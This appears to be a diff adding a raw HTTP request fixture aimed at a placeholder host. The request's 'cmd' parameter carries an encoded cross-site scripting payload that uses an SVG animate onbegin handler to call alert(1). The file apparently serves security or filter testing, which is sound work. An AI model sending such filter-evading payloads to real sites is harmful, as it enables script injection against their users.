@@ -1,0 +1,4 @@
+GET /a?cmd=%26%23x3C;svg%26%23x3E;%26%23x3C;animate%20onbegin%3Dalert(1)%20attributeName%3Dx%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
